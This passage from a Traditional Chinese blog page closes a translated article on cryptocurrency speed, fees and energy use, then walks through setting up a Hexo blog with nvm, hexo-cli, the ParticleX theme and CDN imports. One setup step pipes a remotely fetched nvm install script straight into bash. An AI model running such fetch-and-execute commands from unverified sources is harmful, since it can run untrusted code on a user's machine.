54,000 筆交易 (Transaction)，平均每秒 2,000 筆交易。<br />
比特幣 (Bitcoin) 每秒可處理 3 筆交易，以太坊 (Ethereum) 20
筆，Nano（Raiblocks）約 7,000 筆。</p>
<h3 id="成本-cost">成本 (Cost)</h3>
<p>交易費用 (Transaction Fee)
應盡可能低，這是與其他集中式轉帳或支付解決方案競爭的唯一方式。例如，Paypal
收取 2.9% 的費用 + 0.30 美元。<br />
比特幣 (Bitcoin) 的交易費用 (Transaction Fee) 在高交易量時可能高達 50
美元，但費用波動很大，查看此圖表：<a
target="_blank" rel="noopener" href="https://bitinfocharts.com/comparison/bitcoin-transactionfees.html">Bitinfocharts</a>.<br />
某些加密貨幣 (Cryptocurrency) 如 Nano（Raiblocks）或 Iota 則無交易費用
(Transaction Fee)！</p>
<h3 id="中心化-centralization">中心化 (Centralization)</h3>
<p>中心化 (Centralization)
可能成為問題，導致網絡不安全或不可靠。某些共識機制 (Consensus Mechanism)
可能促使節點 (Node) 更中心化。例如，在工作量證明 (Proof of Work)
中，礦工 (Miner) 傾向於合作組成礦池 (Mining Pool)，然後彼此分享獎勵
(Reward)。</p>
<h3 id="能源浪費-energy-waste">能源浪費 (Energy Waste)</h3>
<p>工作量證明 (Proof of Work) 共識消耗大量電力。比特幣 (Bitcoin) 挖礦
(Mining) 目前的年耗電量為 60 太瓦時，相當於 10 座核電廠的年產量。</p>
<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hHZ2M9G_PoomWJjZ." alt="pic"></p>
<p>你可能認為運行加密貨幣 (Cryptocurrency)
耗電量很大。但不能單獨評判，應與全球銀行系統的耗電量比較，包括：員工工作、辦公室用電、IT
系統全天運行、ATM、運鈔車等。<br />
更多數據請見：<a
target="_blank" rel="noopener" href="https://digiconomist.net/bitcoin-energy-consumption">Digiconomist</a>.</p>
<p>此外，如前所述，有些共識機制 (Consensus Mechanism) 比工作量證明
(Proof of Work) 更高效，甚至可以使用太陽能 🌞！</p>
<h2 id="下一步-next-steps">下一步 (Next Steps)</h2>
<p>這篇文章是我關於區塊鏈 (Blockchain) 與加密貨幣 (Cryptocurrency)
學習挑戰的一部分。我還撰寫了以下相關文章：</p>
<ul>
<li><a
target="_blank" rel="noopener" href="https://medium.com/learning-lab/why-cryptocurrencies-matter-37dd736bc8d0">為什麼加密貨幣很重要？
(Why Cryptocurrencies Matter)</a></li>
<li><a
target="_blank" rel="noopener" href="https://medium.com/learning-lab/proof-of-what-understand-the-distributed-consensuses-in-blockchain-1d9304ae4afe">什麼是共識機制？
(What is a Consensus Mechanism?)</a></li>
<li><a
target="_blank" rel="noopener" href="https://medium.com/learning-lab/how-to-make-money-with-cryptocurrencies-9a6d4a08e976">如何通過加密貨幣賺錢？
(How to Make Money with Cryptocurrencies)</a></li>
<li><a
target="_blank" rel="noopener" href="https://medium.com/learning-lab/how-i-integrated-blockchain-to-my-existing-product-kanbanote-c97c74dafb6c">如何將區塊鏈整合到現有產品（Kanbanote）？
(How to Integrate Blockchain into an Existing Product
(Kanbanote))</a></li>
<li><a
target="_blank" rel="noopener" href="https://medium.com/learning-lab/how-to-build-your-own-cryptocurrency-proof-of-stake-in-just-a-few-minutes-6d526bca4a91">如何在幾分鐘內創建自己的權益證明加密貨幣？
(How to Build Your Own Proof of Stake Cryptocurrency in Just a Few
Minutes)</a></li>
</ul>
<p>如果您喜歡這篇文章，請點擊下面的拍手按鈕 👏
幾次以示支持！也歡迎留言提供反饋。</p>
<p>想看更多類似文章？請在 <a
target="_blank" rel="noopener" href="https://www.patreon.com/sandoche">Patreon</a> 上支持我 🙌</p>
<p><strong>關於作者</strong><br />
<strong>Sandoche ADITTANE</strong><br />
我每個月學習一個主題並撰寫相關文章！<br />
<a target="_blank" rel="noopener" href="https://medium.com/@sandoche">追蹤作者</a></p>
<p><strong>發布於</strong><br />
<a target="_blank" rel="noopener" href="https://medium.com/learning-lab">Learning Lab</a><br />
每月學習一個主題的刊物<br />
<a target="_blank" rel="noopener" href="https://medium.com/learning-lab">追蹤刊物</a></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/crypto-currencies/" style="color: #ffa2c4">crypto-currencies</a>
        </span>
        
    </div>
    <a href="/2025/06/10/how-cryptocurrencies-work-translation/" class="go-post">閱讀全文</a>
</div>

<div class="post">
    <a href="/2025/06/09/hexo-setup/">
        <h2 class="post-title">Hexo Setup</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/6/9
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>畢竟這個部落格式使用 <a target="_blank" rel="noopener" href="https://hexo.io/zh-tw/">Hexo</a>
架設的，所以本篇會講述如何設定好一個部落格的解析伺服器，並將文章部署到
<a href="github.io">github.io</a>。</p>
<h1 id="table-of-contents">Table of Contents</h1>
<ul>
<li><a href="#建置環境">建置環境</a></li>
<li><a href="#安裝-nodejs">安裝 Node.js</a></li>
<li><a href="#安裝-hexo-cli">安裝 <code>hexo-cli</code></a></li>
<li><a href="#使用主題">使用主題</a>
<ul>
<li><a href="#安裝-particlex">安裝 ParticleX</a></li>
<li><a href="#程式碼高光">程式碼高光</a></li>
<li><a href="#避免使用中國的資源">避免使用中國的資源</a></li>
<li><a href="#新增導覽頁面">新增導覽頁面</a></li>
<li><a href="#建立新文章">建立新文章</a></li>
<li><a href="#大功告成查看結果">大功告成，查看結果</a></li>
<li><a href="#部署到-githubio">部署到 github.io</a></li>
</ul></li>
</ul>
<h1 id="建置環境">建置環境</h1>
<p><strong>Ubuntu</strong></p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌─[t2o0n321@ubuntu24]</span> <span class="at">-</span> <span class="pp">[</span><span class="ss">~/blog</span><span class="pp">]</span> <span class="at">-</span> [2025-06-09 06:50:32]</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─[0]</span> <span class="op">&lt;&gt;</span> lsb_release <span class="at">-a</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">No</span> LSB modules are available.</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Distributor</span> ID: Ubuntu</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Description:</span>    Ubuntu 24.04.2 LTS</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Release:</span>        24.04</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Codename:</span>       noble</span></code></pre></div>
<p><strong>Node.js</strong></p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌─[t2o0n321@ubuntu24]</span> <span class="at">-</span> <span class="pp">[</span><span class="ss">~/blog</span><span class="pp">]</span> <span class="at">-</span> [2025-06-09 06:57:44]</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─[0]</span> <span class="op">&lt;&gt;</span> node <span class="at">-v</span> </span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">v24.1.0</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">┌─[t2o0n321@ubuntu24]</span> <span class="at">-</span> <span class="pp">[</span><span class="ss">~/blog</span><span class="pp">]</span> <span class="at">-</span> [2025-06-09 06:57:51]</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">└─[0]</span> <span class="op">&lt;&gt;</span> npm <span class="at">--version</span>                       </span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">11.3.0</span></span></code></pre></div>
<h1 id="安裝-node.js">安裝 Node.js</h1>
<p>Hexo 使用 Node.js
進行開發，所以理所當然我們需要擁有它的環境，以下使用 NVM 進行安裝：</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Download and install nvm:</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-o-</span> https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh <span class="kw">|</span> <span class="fu">bash</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="co"># in lieu of restarting the shell</span></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">\.</span> <span class="st">&quot;</span><span class="va">$HOME</span><span class="st">/.nvm/nvm.sh&quot;</span></span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Download and install Node.js:</span></span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">nvm</span> install 24</span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Verify the Node.js version:</span></span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="ex">node</span> <span class="at">-v</span> <span class="co"># Should print &quot;v24.1.0&quot;.</span></span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="ex">nvm</span> current <span class="co"># Should print &quot;v24.1.0&quot;.</span></span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Verify npm version:</span></span>
<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> <span class="at">-v</span> <span class="co"># Should print &quot;11.3.0&quot;.</span></span>
<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="ex">nvm</span> use 24</span></code></pre></div>
<h1 id="安裝-hexo-cli">安裝 <code>hexo-cli</code></h1>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> install hexo-cli <span class="at">-g</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> blog</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> blog</span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> init</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> install</span></code></pre></div>
<h1 id="使用主題">使用主題</h1>
<p>主題可以至<a
target="_blank" rel="noopener" href="https://hexo.io/themes/">官方網站</a>尋找想要的，以下我會使用 <a
target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a>：</p>
<h2 id="安裝-particlex">安裝 ParticleX</h2>
<p>將 repo clone 至 <code>themes/</code>：</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> themes</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/theme-particlex/hexo-theme-particlex.git particlex <span class="at">--depth</span><span class="op">=</span>1</span></code></pre></div>
<p>然後將根目錄的 <code>_config.yml</code> 裡面的 <code>theme</code>
section 更改成 ParticleX 即可：</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">theme</span><span class="kw">:</span><span class="at"> particlex</span></span></code></pre></div>
<p>關閉 Hexo 的自帶程式碼高光功能，更改根目錄的 <code>_config.yml</code>
的 <code>syntax_highlighter</code> 為以下：</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">syntax_highlighter</span><span class="kw">:</span></span></code></pre></div>
<p>然後在底下加入：</p>
<div class="sourceCode" id="cb8"><pre
class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">pandoc</span><span class="kw">:</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="fu">extra</span><span class="kw">:</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="at">        </span><span class="kw">-</span><span class="at"> </span><span class="fu">no-highlight</span><span class="kw">:</span></span></code></pre></div>
<p>使用 Hexo 自帶的歸檔功能，在根目錄的 <code>_config.yml</code>
最底下加入：</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">archive_generator</span><span class="kw">:</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="fu">enabled</span><span class="kw">:</span><span class="at"> </span><span class="ch">true</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="fu">per_page</span><span class="kw">:</span><span class="at"> </span><span class="dv">0</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="fu">yearly</span><span class="kw">:</span><span class="at"> </span><span class="ch">false</span></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="fu">monthly</span><span class="kw">:</span><span class="at"> </span><span class="ch">false</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="fu">daily</span><span class="kw">:</span><span class="at"> </span><span class="ch">false</span></span></code></pre></div>
<p>清除暫存資料：</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hexo</span> clean</span></code></pre></div>
<p>其他設定可以自行參考 Project 的
README，我必較懶，所以就不多贅述了😂</p>
<h2 id="程式碼高光">程式碼高光</h2>
<p>安裝 pandoc</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install pandoc <span class="at">-y</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> install hexo-renderer-pandoc <span class="at">--save</span></span></code></pre></div>
<p>因爲原版本的程式碼渲染一直有問題，所以我更改了
<code>themes/particlex/source/js/lib/highlight.js</code> 的渲染邏輯，將
<code>highlight()</code> 的整段程式碼更改成：</p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">highlight</span>() &#123;</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> codes <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">querySelectorAll</span>(<span class="st">&quot;pre&quot;</span>)<span class="op">;</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">let</span> i <span class="kw">of</span> codes) &#123;</span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> code <span class="op">=</span> i<span class="op">.</span><span class="at">textContent</span><span class="op">;</span></span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> language <span class="op">=</span> i<span class="op">.</span><span class="at">classList</span>[i<span class="op">.</span><span class="at">classList</span><span class="op">.</span><span class="at">length</span> <span class="op">-</span> <span class="dv">1</span>] <span class="op">===</span> <span class="st">&#39;sourceCode&#39;</span> <span class="op">?</span> <span class="st">&#39;sourceCode&#39;</span> <span class="op">:</span> i<span class="op">.</span><span class="at">classList</span>[i<span class="op">.</span><span class="at">classList</span><span class="op">.</span><span class="at">length</span> <span class="op">-</span> <span class="dv">1</span>]<span class="op">;</span></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> highlighted<span class="op">;</span></span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> &#123;</span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>            highlighted <span class="op">=</span> hljs<span class="op">.</span><span class="fu">highlight</span>(code<span class="op">,</span> &#123; language &#125;)<span class="op">.</span><span class="at">value</span><span class="op">;</span></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>        &#125; <span class="cf">catch</span> (e) &#123;</span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>            <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&#39;Highlighting failed for language:&#39;</span><span class="op">,</span> language<span class="op">,</span> e)<span class="op">;</span></span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>            highlighted <span class="op">=</span> code<span class="op">;</span></span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>        i<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`</span></span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="vs">            &lt;div class=&quot;code-content hljs&quot;&gt;</span><span class="sc">$&#123;</span>highlighted<span class="sc">&#125;</span><span class="vs">&lt;/div&gt;</span></span>
<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="vs">            &lt;div class=&quot;language&quot;&gt;</span><span class="sc">$&#123;</span>language<span class="sc">&#125;</span><span class="vs">&lt;/div&gt;</span></span>
<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a><span class="vs">            &lt;div class=&quot;copycode&quot;&gt;</span></span>
<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a><span class="vs">                &lt;i class=&quot;fa-solid fa-copy fa-fw&quot;&gt;&lt;/i&gt;</span></span>
<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a><span class="vs">                &lt;i class=&quot;fa-solid fa-check fa-fw&quot;&gt;&lt;/i&gt;</span></span>
<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a><span class="vs">            &lt;/div&gt;</span></span>
<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a><span class="vs">        `</span><span class="op">;</span></span>
<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> content <span class="op">=</span> i<span class="op">.</span><span class="fu">querySelector</span>(<span class="st">&quot;.code-content&quot;</span>)<span class="op">;</span></span>
<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a>        hljs<span class="op">.</span><span class="fu">lineNumbersBlock</span>(content<span class="op">,</span> &#123; <span class="dt">singleLine</span><span class="op">:</span> <span class="kw">true</span> &#125;)<span class="op">;</span></span>
<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> copycode <span class="op">=</span> i<span class="op">.</span><span class="fu">querySelector</span>(<span class="st">&quot;.copycode&quot;</span>)<span class="op">;</span></span>
<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a>        copycode<span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&quot;click&quot;</span><span class="op">,</span> <span class="kw">async</span> () <span class="kw">=&gt;</span> &#123;</span>
<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> (<span class="kw">this</span><span class="op">.</span><span class="at">copying</span>) <span class="cf">return</span><span class="op">;</span></span>
<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a>            <span class="kw">this</span><span class="op">.</span><span class="at">copying</span> <span class="op">=</span> <span class="kw">true</span><span class="op">;</span></span>
<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a>            copycode<span class="op">.</span><span class="at">classList</span><span class="op">.</span><span class="fu">add</span>(<span class="st">&quot;copied&quot;</span>)<span class="op">;</span></span>
<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">await</span> <span class="bu">navigator</span><span class="op">.</span><span class="at">clipboard</span><span class="op">.</span><span class="fu">writeText</span>(code)<span class="op">;</span></span>
<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a>            <span class="cf">await</span> <span class="kw">this</span><span class="op">.</span><span class="fu">sleep</span>(<span class="dv">1000</span>)<span class="op">;</span></span>
<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a>            copycode<span class="op">.</span><span class="at">classList</span><span class="op">.</span><span class="fu">remove</span>(<span class="st">&quot;copied&quot;</span>)<span class="op">;</span></span>
<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a>            <span class="kw">this</span><span class="op">.</span><span class="at">copying</span> <span class="op">=</span> <span class="kw">false</span><span class="op">;</span></span>
<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a>        &#125;)<span class="op">;</span></span>
<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a>&#125;<span class="op">,</span></span></code></pre></div>
<h2 id="避免使用中國的資源">避免使用中國的資源</h2>
<p>由於 ParticleX
的作者是中國人，引入的資源都是使用那邊的，我們使用的話載入速度會很慢，因此我更換成使用
<code>cdnjs.cloudflare.com</code>，修改
<code>themes/particlex/layout/import.ejs</code>：</p>
<div class="sourceCode" id="cb13"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;preconnect&quot;</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;https://cdnjs.cloudflare.com&quot;</span> <span class="dt">/&gt;</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/vue/3.5.13/vue.global.prod.min.js&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;stylesheet&quot;</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css&quot;</span> <span class="dt">/&gt;</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;preconnect&quot;</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;https://fonts.googleapis.com&quot;</span> <span class="dt">/&gt;</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;preconnect&quot;</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;https://fonts.gstatic.com&quot;</span> <span class="er">crossorigin</span> <span class="dt">/&gt;</span></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="ot">    rel=</span><span class="st">&quot;stylesheet&quot;</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="ot">    href=</span><span class="st">&quot;https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700</span><span class="er">&amp;</span><span class="st">family=Lexend:wght@400;500;600;700;800;900</span><span class="er">&amp;</span><span class="st">family=Noto+Sans+SC:wght@400;500;600;700;800;900</span><span class="er">&amp;</span><span class="st">display=swap&quot;</span></span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="dt">/&gt;</span></span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span> <span class="kw">const</span> mixins <span class="op">=</span> &#123;&#125;<span class="op">;</span> <span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>% if (theme.polyfill.enable) &#123; %&gt;</span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://polyfill.alicdn.com/v3/polyfill.min.js?features=</span><span class="er">&lt;</span><span class="st">%- theme.polyfill.features %&gt;&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>% &#125; %&gt;</span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>% if (theme.highlight.enable) &#123; %&gt;</span>
<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/highlightjs-line-numbers.js/2.6.0/highlightjs-line-numbers.min.js&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;stylesheet&quot;</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/default.min.css&quot;</span><span class="dt">&gt;</span></span>
<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/bash.min.js&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">link</span></span>
<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a><span class="ot">    rel=</span><span class="st">&quot;stylesheet&quot;</span></span>
<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a><span class="ot">    href=</span><span class="st">&quot;https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/</span><span class="er">&lt;</span><span class="st">%- theme.highlight.style %&gt;.min.css&quot;</span></span>
<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a><span class="dt">/&gt;</span></span>
